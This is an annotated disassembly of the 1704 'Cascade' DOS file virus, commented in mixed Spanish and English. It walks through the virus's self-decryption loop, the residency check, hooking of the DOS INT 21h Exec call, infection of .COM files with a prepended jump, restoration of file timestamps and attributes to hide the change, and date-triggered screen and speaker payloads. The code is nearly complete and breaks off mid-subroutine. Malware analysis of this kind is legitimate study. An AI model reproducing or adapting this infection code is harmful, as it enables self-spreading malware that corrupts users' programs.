Variables:
    DW[014B]=File Size
    3B[014F]=JMP ???? Code writen at de top of the new infected program
    B [0152]=Number of Screen Columns
    B [0153]=Number of Screen Rows
    B [0154]=1 If 80 Rows, Text Mode, Base=B800
           0 If Not 
    B [0155]=Char Moved
    B [0156]=Hi Byte Of Moved Char's Addres Offset
    B [0157]=Byte de Flags
        Bit Function
         0      In 1704's INT 1C rutine
         1      In 1704's CASCADE rutine
         3      Correct Year for Attack
    W [0158]=Display Memory Base Sgement B000 o B800
    W [015A]=Offset to the Display Page Memory from de Display Memory Base Segment
    W [0162]=Total Screen Characters
    W [0164]=Comienza de 1 y va *=Random(1-4) hasta ffff, marca el limite superior
             del Random del proccimo caracter a mover.


Subrutines:
    Offset  Function                Inputs                  Outputs
    06F7    Random                  AX=Maximo               AX=Random 0-Maximo
    0722    Copia el contenido      None                    None
            del clock de BIOS
            0040:006C a CS:0166
    0740    Get Byte AT(X,Y)        DL=X                    AL=Byte AT(DL,DH)
                                    DH=Y                    AH=Hi byte of char
                                                            offset on screen
                                                            memory
    0778    Set Byte AT(X,Y)        DL=X                    AH=Hi byte of char
                                    DH=Y                    offset on screen
                                    AL=Char                 memory
    07B6    Delay(CX)               CX=Delay
    07C3    Change Speaker Status   None                    None
    07CE    Determines if AL==' '   AL=Char                 Carry=1 AL==' '
                                                            Carry=0 AL!=' '
    07DE    Determines if           AL=Char                 Carry=1 AL Graphic
            AL is a Graphic char                            Carry=0 AL not Grphc
    07EA    Get speed factor        None                    AX=Speed Factor
                                                            CX=000F
                                                            DX=0000
    081A    CASCADE and             DS=ES=CS                AX=????
            Speaker Tck                                     CX=????
                                                            BX=????
                                                            SI=????
                                                            DI=????
    09D4    Encripta y Escribe      BX=File Handle
            a disco el 1704


0100 E9 83 02                JMP 0386                   ; Salto agregado por el 1704
0385 01                      DB  01
0386 FA                      CLI                        ;
0387 8B EC                   MOV BP,SP                  ;
0389 E8 00 00                CALL 038C                  ;
038C 5B                      POP BX                     ;
038D 81 EB 31 01             SUB BX,0131                ;
0391 2E F6 87 2A 01 01       TEST CS:[BX+012A],01       ; Esta parte desencripta
0397 74 0F                   JE 03A8                    ; todo el codigo que esta
0399 8D B7 4D 01             LEA SI,[BX+014D]           ; depues de 03A8
039D BC 85 06                MOV SP,0685                ; SP=0685
03A0 31 34                   XOR [SI],SI                ;
03A2 31 24                   XOR [SI],SP                ;
03A4 46                      INC SI                     ;
03A5 4C                      DEC SP                     ;
03A6 75 F8                   JNE 03A0                   ;
03A8 8B E5                   MOV SP,BP                  ; SP=Original SP=0000
03AA EB 4F                   JMP 03FB
03AC 90                      NOP
03AD 00 01                   ADD B[BX+DI],AL
03AF 86 19                   XCHG B[BX+DI],BL
03B1 00 00                   ADD B[BX+SI],AL
03B3 E9 21 01                JMP 04D7
03B6 00 00                   ADD B[BX+SI],AL
03B8 53                      PUSH BX
03B9 FF 00                   INC W[BX+SI]
03BB F0 1C 02                LOCK SBB AL,2
03BE 57                      PUSH DI
03BF 12 45 14                ADC AL,B[DI+014]
03C2 6A 02                   PUSH 2
03C4 00 00                   ADD B[BX+SI],AL
03C6 20 00                   AND B[BX+SI],AL
03C8 22 00                   AND AL,B[BX+SI]
03CA CD 26                   INT 026
03CC 8E 11                   MOV SS,W[BX+DI]
03CE FC                      CLD
03CF 10 85 02 00             ADC B[DI+2],AL
03D3 00 E9                   ADD CL,CH
03D5 7B 24                   JPO 03FB
03D7 00 00                   ADD B[BX+SI],AL
03D9 00 00                   ADD B[BX+SI],AL
03DB 00 08                   ADD B[BX+SI],CL
03DD 00 00                   ADD B[BX+SI],AL
03DF 00 00                   ADD B[BX+SI],AL
03E1 C8 03 E4 09             ENTER 0E403,9
03E5 E4 09                   IN AL,9
03E7 00 00                   ADD B[BX+SI],AL
03E9 01 00                   ADD W[BX+SI],AX
03EB 16                      PUSH SS
03EC 38 0D                   CMP B[DI],CL
03EE 00 00                   ADD B[BX+SI],AL
03F0 00 00                   ADD B[BX+SI],AL
03F2 00 00                   ADD B[BX+SI],AL
03F4 01 00                   ADD W[BX+SI],AX
03F6 00 14                   ADD B[SI],DL
03F8 14 14                   ADC AL,014
03FA 14                      DB  14h

                                ; Aca continua depues de desencriptarse

03FB E8 00 00                CALL 03FE                  
03FE 5B                      POP BX                     ; BX=03FE
03FF 81 EB A3 01             SUB BX,01A3                ; BX=025B
0403 2E 8C 8F 54 01          MOV CS:[BX+0154],CS        ; CS:[03AF]
0408 2E 89 87 56 01          MOV CS:[BX+0156],AX        ; CS:[03B1]
040D 2E 8B 87 58 01          MOV AX,CS:[BX+0158]        ; AX=CS:[03B3]
0412 A3 00 01                MOV [0100],AX              ; Restorea los 3 primeros bytes
0415 2E 8A 87 5A 01          MOV AL,[BX+015A]           ; originales del programa
041A A2 02 01                MOV [0102],AL              ; en este JMP 0224
041D 53                      PUSH BX
041E B4 30                   MOV AH,030                 ;
0420 CD 21                   INT 021                    ; Get DOS Version
0422 5B                      POP BX                     ; BX=025B
0423 3C 02                   CMP AL,2                   ; Si es menor que la V2
0425 72 0F                   JB 0436                    ; salta a 0436
0427 B8 FF 4B                MOV AX,04BFF               ;
042A 33 FF                   XOR DI,DI                  ; Llama Exec pero con Al=FFh
042C 33 F6                   XOR SI,SI                  ; subfuncion instalada por
042E CD 21                   INT 021                    ; el 1704 si instalado:
                                                        ; DI=55AA
                                                        ; ES:AX=Seg:Ofs Of INT 21
                                                        ; DX=CS
0430 81 FF AA 55             CMP DI,055AA
0434 75 0D                   JNE 0443
0436 FB                      STI
0437 1E                      PUSH DS                    ; Restores ES and AX
0438 07                      POP ES                     ; Jumps To [CS:03AD] CS:0100
0439 2E 8B 87 56 01          MOV AX,CS:[BX+0156]        ; This means continue with
043E 2E FF AF 52 01          JMP Dword Ptr CS:[BX+0152] ; the original program.
0443 53                      PUSH BX
0444 B8 21 35                MOV AX,03521               ; Lee el puntero de INT 21h
0447 CD 21                   INT 021                    ; en ES:BX
0449 8B C3                   MOV AX,BX
044B 5B                      POP BX                     ; BX=025B
044C 2E 89 87 61 01          MOV CS:[BX+0161],AX        ; Lo guarda en:
0451 2E 8C 87 63 01          MOV CS:[BX+0163],ES        ; [03BE]:[03BC]
0456 B8 00 F0                MOV AX,0F000               ;
0459 8E C0                   MOV ES,AX                  ; ES=F000
045B BF 08 E0                MOV DI,0E008
045E 26 81 3D 43 4F          CMP ES:[DI],04F43          ;
0463 75 1F                   JNE 0484                   ; Looks for the string:
0465 26 81 7D 02 50 52       CMP ES:[DI+2],05250        ; COPR. IBM at F000:E008
046B 75 17                   JNE 0484                   ; It determines if the machine
046D 26 81 7D 04 2E 20       CMP ES:[DI+4],0202E        ; is an original IBM or not.
0473 75 0F                   JNE 0484                   ;
0475 26 81 7D 06 49 42       CMP ES:[DI+6],04249        ;
047B 75 07                   JNE 0484                   ;
047D 26 83 7D 08 4D          CMP ES:[DI+8],04D          ;
0482 74 B2                   JE 0436                    ; Si encuentra la cadena no infecta.
0484 B8 7B 00                MOV AX,07B                 ; AX=007B
0487 8C CD                   MOV BP,CS                  ;
0489 4D                      DEC BP                     ; BP=CS-1
048A 8E C5                   MOV ES,BP                  ; ES=CS-1
048C 2E 8B 36 16 00          MOV SI,CS:[0016]           ; SI=CS:0016 ( Parent PSP Segment)
0491 26 89 36 01 00          MOV ES:[0001],SI           ; (CS-1):0001= Parent PSP
0496 26 8B 16 03 00          MOV DX,ES:[0003]           ; DX=[(CS-1):0003] ???
049B 26 A3 03 00             MOV ES:[0003],AX           ; (CS-1):0003=007B
049F 26 C6 06 00 00 4D       MOV ES:[0000],04D          ; (CS-1):0000=4D
                                                        ; Aparentemente arma un MCB
                                                        ; nuevo, el cual reserva memoria
                                                        ; para el 1704, pero apunta al
                                                        ; PSP de parent PSP de este
                                                        ; programa, es decir, al que lo
                                                        ; cargo.
04A5 2B D0                   SUB DX,AX                  ;
04A7 4A                      DEC DX                     ; DX-=007C
04A8 45                      INC BP                     ; BP=CS
04A9 03 E8                   ADD BP,AX                  ;
04AB 45                      INC BP                     ; BP=CS+007C
04AC 8E C5                   MOV ES,BP                  ; ES=CS+007C
04AE 53                      PUSH BX
04AF B4 50                   MOV AH,050                 ; AX=507B
04B1 8B DD                   MOV BX,BP                  ; BX=CS+007C
04B3 CD 21                   INT 021                    ; Sets PSP Segment at CS+007C
04B5 5B                      POP BX                     ; BX=025B
04B6 33 FF                   XOR DI,DI                  ; DI=0
04B8 06                      PUSH ES                    ;
04B9 17                      POP SS                     ; SS=CS+007C
04BA 57                      PUSH DI
04BB 8D BF D1 07             LEA DI,[BX+07D1]           ; DI=0A2C
04BF 8B F7                   MOV SI,DI                  ; SI=0A2C
04C1 B9 A8 06                MOV CX,06A8                ; CX=06A8
04C4 FD                      STD                        ; Copia 06A8 bytes de CS:0384 a ES:384
04C5 F3 A4                   REP MOVSB                  ; Se copia mas arriba, a donde seteo el PSP
04C7 06                      PUSH ES                    ;
04C8 8D 8F 73 02             LEA CX,[BX+0273]           ; Salta a CS:04CE pero
04CC 51                      PUSH CX                    ; arriba en la copia.
04CD CB                      RETF                       ; (CS+007C):04CE

                                ; El programa sigue aca, pero con CS+=007C

04CE 2E 8C 8F 54 01          MOV CS:[BX+0154],CS        ; CS:[03AF]=CS (Ex-CS+=007C)
04D3 8D 8F 2A 01             LEA CX,[BX+012A]           ; CX=0385; SI=DI=0384
04D7 F3 A4                   REP MOVSB                  ; Copia el viejo PSP, lo pone donde lo seteo.
04D9 2E 8C 0E 36 00          MOV CS:[0036],CS           ; Setea el segmento de Open File Table Addres a
                                                        ; donde esta ahora, mas arriba.
04DE 4D                      DEC BP                     ; BP=CS-1
04DF 8E C5                   MOV ES,BP                  ; ES=CS-1
04E1 26 89 16 03 00          MOV ES:[0003],DX           ; (CS-1):0003=DX
04E6 26 C6 06 00 00 5A       MOV ES:[0000],5A           ; (CS-1):0000=5A
04EC 26 8C 0E 01 00          MOV ES:[0001],CS           ; (CS-1):0001=CS
04F1 45                      INC BP                     ; BP=CS
04F2 8E C5                   MOV ES,BP                  ; ES=CS
04F4 1E                      PUSH DS                    ;
04F5 07                      POP ES                     ; ES=DS=(CS Original)
04F6 0E                      PUSH CS                    ;
04F7 1F                      POP DS                     ; DS=CS
04F8 8D B7 2A 01             LEA SI,[BX+012A]           ; SI=0385
04FC BF 00 01                MOV DI,0100                ; DI=0100
04FF B9 A8 06                MOV CX,06A8                ; CX=06A8
0502 FC                      CLD                        ; Se copia a DS:0100,
0503 F3 A4                   REP MOVSB                  ; Sobreescribe el programa infectado.

                                ; En este momento hay en memoria un nuevo programa, el 1704.

0505 06                      PUSH ES                    ;
0506 8D 06 87 02             LEA AX,[0287]              ; AX=0287
050A 50                      PUSH AX                    ; Salta a 050C mas abajo
050B CB                      RETF                       ; o sea aca  = 0287

                                ; El porgrama sigue aca pero con CS-=007C = CS Original

050C 2E C7 06 2C 00 00 00    MOV CS:[02C],0             ; Enviroment Segment = 0
0513 2E 8C 0E 16 00          MOV CS:[016],CS            ; Parent PSP = CS, el mismo
0518 1E                      PUSH DS                    ; DS=CS anterior o CS Original
0519 8D 16 1F 03             LEA DX,[031F]              ; DX=031F
051D 0E                      PUSH CS                    ;
051E 1F                      POP DS                     ; DS=CS
051F B8 21 25                MOV AX,02521               ;
0522 CD 21                   INT 021                    ; Setea el puntero de INT 21 = CS:031F (05A4)
0524 1F                      POP DS                     ; DS=CS Original
0525 B4 1A                   MOV AH,1A                  ;
0527 BA 80 00                MOV DX,0080                ; Set Disk Transfer Addr To
052A CD 21                   INT 021                    ; CS:0080 (Default DTA)
052C E8 F3 01                CALL 0722                  ; Relative Call ( Copia Clock)
052F B4 2A                   MOV AH,02A                 ;             DD DD/MM/YY
0531 CD 21                   INT 021                    ; Get Date To AL DL/DH/CX
0533 81 F9 C4 07             CMP CX,07C4                ; CX=1988?
0537 77 65                   JA 059E                    ; Mayor -> 059E No hace nada.
0539 74 2A                   JE 0565                    ; Igual -> 0565
053B 81 F9 BC 07             CMP CX,07BC                ; CX=1980?
053F 75 5D                   JNE 059E                   ; Si no 1980 No hace nada
0541 1E                      PUSH DS                    ;
0542 B8 28 35                MOV AX,03528               ;
0545 CD 21                   INT 021                    ; Lee puntero INT 28
0547 2E 89 1E 3B 01          CS MOV W[013B],BX          ;
054C 2E 8C 06 3D 01          CS MOV W[013D],ES          ; Lo guarda
0551 B8 28 25                MOV AX,02528               ;
0554 BA 25 07                MOV DX,0725                ;
0557 0E                      PUSH CS                    ;
0558 1F                      POP DS                     ;
0559 CD 21                   INT 021                    ; Setea INT 28 a CS:0725 (09AA)
055B 1F                      POP DS                     ; DS=????
055C 2E 80 0E 57 01 08       OR CS:[0157],8             ; Prende el bit 3 de 0157
0562 EB 06                   JMP 056A                   ; Relative Jump
0564 90                      NOP
0565 80 FE 0A                CMP DH,0A                  ; Mes de Octubre
0568 72 34                   JB 059E                    ; Si menor Termina
056A E8 7D 02                CALL 07EA                  ; Relative Call
                                                        ; AX=Speed | CS=000F | DX=0000
056D B8 18 15                MOV AX,01518               ; AX=1518
0570 E8 84 01                CALL 06F7                  ;
0573 40                      INC AX                     ; AX=Random 1-1519
0574 2E A3 5E 01             MOV CS:[015E],AX           ; Random
0578 2E A3 60 01             MOV CS:[0160],AX           ; Random
057C 2E C7 06 64 01 01 00    MOV CS:[0164],1
0583 B8 1C 35                MOV AX,0351C               ;
0586 CD 21                   INT 021                    ; Lee el vector de INT 1C
0588 2E 89 1E 33 01          MOV CS:[0133],BX           ;
058D 2E 8C 06 35 01          MOV CS:[0135],ES           ; Lo guarda
0592 1E                      PUSH DS                    ;
0593 B8 1C 25                MOV AX,0251C               ;
0596 BA C0 06                MOV DX,06C0                ;
0599 0E                      PUSH CS                    ;
059A 1F                      POP DS                     ;
059B CD 21                   INT 021                    ; Setea INT 1C a CS:06C0 (0945)
059D 1F                      POP DS                     ;
059E BB D6 FF                MOV BX,-02A                ;
05A1 E9 92 FE                JMP 0436                   ; Continua con el programa

                        ; External INT 21h Entry Point

05A4 80 FC 4B                CMP AH,04B                 ; EXEC
05A7 74 10                   JE 05B9
05A9 2E FF 2E 37 01          JMP CS:[0137]              ; Salta a Old Int 21
05AE BF AA 55                MOV DI,055AA               ; DI=55AA
05B1 2E C4 06 37 01          LES AX,CS:[0137]           ; ES:AX=Seg:Ofs Of INT 21
05B6 8C CA                   MOV DX,CS                  ; DX=CS
05B8 CF                      IRET
                                                        ; Exec SubFunction
05B9 3C FF                   CMP AL,0FF                 ;
05BB 74 F1                   JE 05AE                    ; Si Al=FF 
05BD 3C 00                   CMP AL,0                   ;
05BF 75 E8                   JNE 05A9                   ; Only if Load And Exec
05C1 9C                      PUSHF
05C2 50                      PUSH AX
05C3 53                      PUSH BX
05C4 51                      PUSH CX
05C5 52                      PUSH DX
05C6 56                      PUSH SI
05C7 57                      PUSH DI
05C8 55                      PUSH BP
05C9 06                      PUSH ES
05CA 1E                      PUSH DS
05CB 2E 89 16 47 01          MOV CS:[0147],DX
05D0 2E 8C 1E 49 01          MOV CS:[0149],DS
05D5 0E                      PUSH CS                    ; Open file Read Only
05D6 07                      POP ES                     ; DS:DX -> ASCIIZ File Name
05D7 B8 00 3D                MOV AX,03D00               ; Exec = DS:DX ASCIIZ FName
05DA CD 21                   INT 021                    ; -> AX=File Handle
05DC 72 56                   JB 0634                    ; Si error 
05DE 8B D8                   MOV BX,AX                  ; BX=File Handle
05E0 B8 00 57                MOV AX,05700               ; Get File's Date/Time
05E3 CD 21                   INT 021                    ; CX=Time | DX=Date
05E5 2E 89 16 43 01          MOV CS:[0143],DX
05EA 2E 89 0E 45 01          MOV CS:[0145],CX
05EF B4 3F                   MOV AH,03F
05F1 0E                      PUSH CS
05F2 1F                      POP DS                     ;
05F3 BA 2E 01                MOV DX,012E                ; DS:DX -> Buffer
05F6 B9 03 00                MOV CX,3                   ; CX=Number to Read=3
05F9 CD 21                   INT 021                    ; Read From File W/Handle
05FB 72 37                   JB 0634                    ; Si error  Termina
05FD 3B C1                   CMP AX,CX                  ; AX=Numeros Leidos
05FF 75 33                   JNE 0634                   ; Si no leyo 3  Termina
0601 B8 02 42                MOV AX,4202                ; Seek((long)CX:DX)
0604 33 C9                   XOR CX,CX                  ; AL=02 From End
0606 33 D2                   XOR DX,DX                  ; Seek EOF
0608 CD 21                   INT 021                    ; (long)DX:AX new abs pos
060A 2E A3 4B 01             MOV CS:[014B],AX
060E 2E 89 16 4D 01          MOV CS:[014D],DX
0613 B4 3E                   MOV AH,03E                 ;
0615 CD 21                   INT 021                    ; Close File W/Handle
0617 2E 81 3E 2E 01 4D 5A    CMP CS:[012E],5A4D         ; Se fija si el programa es un .EXE
061E 75 03                   JNE 0623                   ; Si es .EXE Termina
0620 E9 C7 00                JMP 06EA                   ; Si es .COM Sigue
0623 2E 83 3E 4D 01 00       CMP CS:[014D],0            ; 
0629 77 09                   JA 0634                    ; Si FSize > 64K  Termina
062B 2E 81 3E 4B 01 38 F9    CMP CS:[014B],F938         ; Si FSize > 64k-1736  Termina
0632 76 03                   JBE 0637                   ; Si FSize < 64k-1736 Sigue
0634 E9 B3 00                JMP 06EA
0637 2E 80 3E 2E 01 E9       CMP CS:[012E],E9           
063D 75 0E                   JNE 064D                   ; Si no comienza con un JMP Short 
063F 2E A1 4B 01             MOV AX,CS:[014B]           ; Toma la longitud y
0643 05 56 F9                ADD AX,F956                ; le suma 64k-1706
0646 2E 3B 06 2F 01          CMP AX,CS:[012F]           ; se fija si el salto es
                                                        ; 1704 bytes antes del final
064B 74 E7                   JE 0634                    ; Si es asi  Termina, esto
                                                        ; quiere decir que ya esta infectado
                                                        ; o que el que lo hizo tiene mucha suerte
064D B8 00 43                MOV AX,4300                ;
0650 2E C5 16 47 01          LDS DX,CS:[0147]           ; Lee los atributos del 
0655 CD 21                   INT 021                    ; archivo -> CX
0657 72 DB                   JB 0634                    ; Si error  Termina
0659 2E 89 0E 41 01          MOV CS:[0141],CX
065E 80 F1 20                XOR CL,020                 ; Invierte Archive, se fija si
0661 F6 C1 27                TEST CL,027                ; Read,Hidd,Sys,Vol estan ON
0664 74 09                   JE 066F                    ; Si asi es 
0666 B8 01 43                MOV AX,04301               ;
0669 33 C9                   XOR CX,CX                  ;
066B CD 21                   INT 021                    ; Resetea todos los Bits
066D 72 C5                   JB  0634                    ; Si error 
066F B8 02 3D                MOV AX,03D02               ; Open Read/Write
0672 CD 21                   INT 021                    ; Handle -> AX
0674 72 BE                   JB  0634                   ; Si error 
0676 8B D8                   MOV BX,AX                  ; BX=Handle

;0678 B8 62 CF                MOV AX,CF62               ;
;067B CC                      INT 3                     ;
;067C C8 68 D7 27             ENTER 0D768,027           ; Esta parte que
;0680 1D 2A 2C                SBB AX,02C2A              ; estaba encriptada
;0683 2D 29 18                SUB AX,01829              ; se traduce como:

0678 B8 02 42                MOV AX,4202                ;
067B 33 C9                   XOR CX,CX                  ;
067D 33 D2                   XOR DX,DX                  ;
067F CD 21                   INT 21                     ; Seek EOF
0681 E8 50 03                CALL 09D4                  ; Se encripta y escribe
0684 73 18                   JAE 069E                   ; Si no Error 

0686 B8 00 42                MOV AX,04200               ; Seek from begining
0689 2E 8B 0E 4D 01          MOV CX,CS:[014D]           ; CX:DX = File Length
068E 2E 8B 16 4B 01          MOV DX,CS:[014B]           ;
0693 CD 21                   INT 021                    ; Seek EOF
0695 B4 40                   MOV AH,040                 ; Truncate at EOF
0697 33 C9                   XOR CX,CX                  ; de esta forma borra
0699 CD 21                   INT 021                    ; todo lo que escribio.
069B EB 21                   JMP 06BE                   ; 
069D 90                      NOP
069E B8 00 42                MOV AX,04200               ; Si escribio llega aca
06A1 33 C9                   XOR CX,CX                  ;
06A3 33 D2                   XOR DX,DX                  ;
06A5 CD 21                   INT 021                    ; Seek Start
06A7 72 15                   JB  06BE                   ; Si error 
06A9 2E A1 4B 01             MOV AX,CS:[014B]           ; AX=File Size
06AD 05 FE FF                ADD AX,-2                  ; AX=File Size-2
06B0 2E A3 50 01             MOV CS:[0150],AX           ; CS:[0150]=File Size-2
06B4 B4 40                   MOV AH,040                 ;
06B6 BA 4F 01                MOV DX,014F                ; Apunta a CS:014F y
06B9 B9 03 00                MOV CX,3                   ; escribe los 3 bytes
06BC CD 21                   INT 021                    ; del JMP al 1704
06BE B8 01 57                MOV AX,05701               ;
06C1 2E 8B 16 43 01          MOV DX,CS:[0143]           ; Set Date/Time
06C6 2E 8B 0E 45 01          MOV CX,CS:[0145]           ; CX=Time | DX=Date
06CB CD 21                   INT 021                    ; No cambia la fecha
06CD B4 3E                   MOV AH,03E                 ;
06CF CD 21                   INT 021                    ; Close File
06D1 2E 8B 0E 41 01          MOV CX,CS:[0141]           ; CX=File Attr
06D6 F6 C1 07                TEST CL,7                  ; Read,Hidd,Sys?
06D9 75 05                   JNE 06E0                   ; Alguno perndido? 
06DB F6 C1 20                TEST CL,020                ; Archive?
06DE 75 0A                   JNE 06EA                   ; Si no archive 
06E0 B8 01 43                MOV AX,04301               ; Restorea los Attr
06E3 2E C5 16 47 01          LDS DX,CS:[0147]           ; DS:DX -> File Name
06E8 CD 21                   INT 021                    ; Set File Attr
06EA 1F                      POP DS                     ;
06EB 07                      POP ES                     ;
06EC 5D                      POP BP                     ;
06ED 5F                      POP DI                     ;
06EE 5E                      POP SI                     ;
06EF 5A                      POP DX                     ;
06F0 59                      POP CX                     ;
06F1 5B                      POP BX                     ;
06F2 58                      POP AX                     ;
06F3 9D                      POPF                       ;
06F4 E9 B2 FE                JMP 05A9                   ; Sigue con Old INT 21

                                ; Subrutine Called from 0570, 0976
                                ;            AX=Random(0-AX)
                                ; Input:        AX=Maximo
                                ; Output:       AX=Random from 0 To Maximo

06F7 1E                      PUSH DS
06F8 0E                      PUSH CS                    ;
06F9 1F                      POP DS                     ; DS=CS
06FA 53                      PUSH BX                    ;
06FB 51                      PUSH CX                    ;
06FC 52                      PUSH DX                    ;
06FD 50                      PUSH AX                    ;
06FE B9 07 00                MOV CX,7                   ; CX=0007
0701 BB 74 01                MOV BX,0174                ; BX=0174
0704 FF 37                   PUSH W[BX]                 ;
0706 8B 47 FE                MOV AX,W[BX-2]             ;
0709 11 07                   ADC W[BX],AX               ;
070B 4B                      DEC BX                     ;
070C 4B                      DEC BX                     ;
070D E2 F7                   LOOP 0706                  ;
070F 58                      POP AX                     ;
0710 11 07                   ADC W[BX],AX               ;
0712 8B 17                   MOV DX,W[BX]               ;
0714 58                      POP AX                     ;
0715 0B C0                   OR AX,AX                   ;
0717 74 02                   JE 071B                    ;
0719 F7 E2                   MUL DX                     ;
071B 8B C2                   MOV AX,DX                  ;
071D 5A                      POP DX                     ;
071E 59                      POP CX                     ;
071F 5B                      POP BX                     ;
0720 1F                      POP DS                     ;
0721 C3                      RET                        ; Returns

                                ; Subrutine Called from 052C
                                ; Copia Clock

0722 1E                      PUSH DS
0723 06                      PUSH ES
0724 56                      PUSH SI
0725 57                      PUSH DI
0726 51                      PUSH CX
0727 0E                      PUSH CS                    ;
0728 07                      POP ES                     ;
0729 B9 40 00                MOV CX,0040                ; Copia el contenido
072C 8E D9                   MOV DS,CX                  ; del clock de BIOS
072E BF 66 01                MOV DI,0166                ; 0040:006C a CS:0166
0731 BE 6C 00                MOV SI,06C                 ; No toma parametros.
0734 B9 08 00                MOV CX,8                   ; no destrulle nada.
0737 FC                      CLD                        ;
0738 F3 A5                   REP MOVSW                  ;
073A 59                      POP CX
073B 5F                      POP DI
073C 5E                      POP SI
073D 07                      POP ES
073E 1F                      POP DS
073F C3                      RET

                                        ; Subrutine Called From 08B7
                                        ; Input: DH=Fila
                                        ;        DL=Columna
                                        ; Return: AL=Screen's Byte
                                        ;         AH=Hi byte of char offset on screen memory

0740 56                      PUSH SI
0741 1E                      PUSH DS
0742 52                      PUSH DX
0743 8A C6                   MOV AL,DH                  ; AL=DH=Fila
0745 F6 26 52 01             MUL B[0152]                ; Screen Columns * Fila
0749 B6 00                   MOV DH,0                   ; DH=00
074B 03 C2                   ADD AX,DX                  ; AX+=Columna
074D D1 E0                   SHL AX,1                   ; AX*=2
074F 03 06 5A 01             ADD AX,W[015A]             ; AX+=Ofst 0 for Screen
                                                        ; AX=Mem Pos AT(DL,DH)
0753 8B F0                   MOV SI,AX                  ; SI=Char on Screen
0755 F6 06 54 01 FF          TEST [0154],0FF            ;
075A 8E 1E 58 01             MOV DS,W[0158]             ; DS=B000 o B800
075E 74 12                   JE 0772                    ; If Not 80,Text,B800 
0760 BA DA 03                MOV DX,03DA                ; Port 03DA=Color Card
0763 FA                      CLI                        ; Status Register
0764 EC                      IN AL,DX                   ;
0765 A8 08                   TEST AL,8                  ; Bit 3 = Vertical Retrace
0767 75 09                   JNE 0772                   ; If 1 Can acces RAM 
0769 A8 01                   TEST AL,1                  ; Bit 1 = Display Enable
076B 75 F7                   JNE 0764                   ; If 1 Enabled 
076D EC                      IN AL,DX                   ;
076E A8 01                   TEST AL,1                  ; If Video not Enabled
0770 74 FB                   JE 076D                    ; Wait Until So. 
0772 AD                      LODSW                      ; Carga un Byte de Screen
0773 FB                      STI                        ;
0774 5A                      POP DX                     ;
0775 1F                      POP DS                     ;
0776 5E                      POP SI                     ;
0777 C3                      RET                        ;

                                        ; Subrutine Called from 0918
                                        ; Print AT(X,Y)
                                        ; Input: AL = Char
                                        ;        DL = X
                                        ;        DH = Y


0778 57                      PUSH DI                    ;
0779 06                      PUSH ES                    ;
077A 52                      PUSH DX                    ;
077B 53                      PUSH BX                    ;
077C 8B D8                   MOV BX,AX                  ; BX=??Char
077E 8A C6                   MOV AL,DH                  ;
0780 F6 26 52 01             MUL B[0152]                ; AX=Columns*Y
0784 B6 00                   MOV DH,0                   ; DH=0
0786 03 C2                   ADD AX,DX                  ;
0788 D1 E0                   SHL AX,1                   ; DI=AX=Offset to store
078A 03 06 5A 01             ADD AX,W[015A]             ; char on current screen
078E 8B F8                   MOV DI,AX                  ; DI=
0790 F6 06 54 01 FF          TEST B[0154],0FF           ;
0795 8E 06 58 01             MOV ES,W[0158]             ; ES=B000 o B800
0799 74 12                   JE 07AD                    ; Incorrect scrn mode ?
079B BA DA 03                MOV DX,03DA                ; Port 03DA=Color Card
079E FA                      CLI                        ; Status Register
079F EC                      IN AL,DX                   ;
07A0 A8 08                   TEST AL,8                  ; Bit 3 = Vertical Retrace
07A2 75 09                   JNE 07AD                   ; If 1 Can acces RAM 
07A4 A8 01                   TEST AL,1                  ; Bit 1 = Display Enable
07A6 75 F7                   JNE 079F                   ; If 1 Enabled 
07A8 EC                      IN AL,DX                   ;
07A9 A8 01                   TEST AL,1                  ; If Video not Enabled
07AB 74 FB                   JE 07A8                    ; Wait Until So. 
07AD 8B C3                   MOV AX,BX                  ; AL=Char
07AF AA                      STOSB                      ; Store Char on screen
07B0 FB                      STI
07B1 5B                      POP BX
07B2 5A                      POP DX
07B3 07                      POP ES
07B4 5F                      POP DI
07B5 C3                      RET

                                    ; Subrutine called from 0925
                                    ; Delay(CX)
                                    ; Input: CX = Delay time

07B6 51                      PUSH CX                    ;
07B7 51                      PUSH CX                    ;
07B8 8B 0E 5C 01             MOV CX,W[015C]             ;
07BC E2 FE                   LOOP 07BC                  ;
07BE 59                      POP CX                     ;
07BF E2 F6                   LOOP 07B7                  ;
07C1 59                      POP CX                     ;
07C2 C3                      RET                        ;

                                    ; Subrutine called from 0902
                                    ; Change speaker status

07C3 50                      PUSH AX                    ;
07C4 E4 61                   IN AL,061                  ;
07C6 34 02                   XOR AL,2                   ; Change Speaker Status
07C8 24 FE                   AND AL,0FE                 ; It Produces a Tck
07CA E6 61                   OUT 061,AL                 ;
07CC 58                      POP AX
07CD C3                      RET

                                        ; Subrutine Called from 08BA
                                        ; AL=' '

07CE 3C 00                   CMP AL,0                   ;
07D0 74 0A                   JE 07DC                    ;
07D2 3C 20                   CMP AL,020                 ;
07D4 74 06                   JE 07DC                    ;
07D6 3C FF                   CMP AL,0FF                 ;
07D8 74 02                   JE 07DC                    ; AL=' ' ?  C=1 Return
07DA F8                      CLC                        ; Carry=0
07DB C3                      RET                        ; Return
07DC F9                      STC                        ; Carry=1
07DD C3                      RET                        ; Return

                                        ; Subrutine Called from 08BF
                                        ; AL=Graph

07DE 3C B0                   CMP AL,0B0                 ;
07E0 72 06                   JB 07E8                    ; If AL=Graphic Char
07E2 3C DF                   CMP AL,0DF                 ;       Carry=1
07E4 77 02                   JA 07E8                    ; If Not
07E6 F9                      STC                        ;       Carry=0
07E7 C3                      RET                        ;
07E8 F8                      CLC                        ;
07E9 C3                      RET                        ;

                                ; Subrutine Called from 056A
                                ; Returns:   AX=Cociente velocidad
                                ;            CX=000F
                                ;            DX=0000

07EA 1E                      PUSH DS
07EB B8 40 00                MOV AX,040
07EE 8E D8                   MOV DS,AX                  ; DS=0040 BIOS Data Segment
07F0 FB                      STI
07F1 A1 6C 00                MOV AX,W[06C]
07F4 3B 06 6C 00             CMP AX,W[06C]
07F8 74 FA                   JE 07F4                    ; Espera que el clock corra sino, !!!
07FA 33 C9                   XOR CX,CX                  ; CX=0
07FC A1 6C 00                MOV AX,W[06C]              ; AX=Clock
07FF 41                      INC CX                     ; CX++
0800 74 15                   JE 0817                    ; CX=0000 ?  CX=FFFF y sigue en 0808
0802 3B 06 6C 00             CMP AX,W[06C]
0806 74 F7                   JE 07FF                    ; Si no cambio el Clock , solo en
                                                        ; maquinas muy rapidas cambia
0808 1F                      POP DS
0809 8B C1                   MOV AX,CX                  ; AX=Cuanto tardo en cambiar depende
                                                        ; de la velocidad de la maquina
                                                        ; Mas alto a mas velocidad
080B 33 D2                   XOR DX,DX                  ; DX=0
080D B9 0F 00                MOV CX,0F                  ;
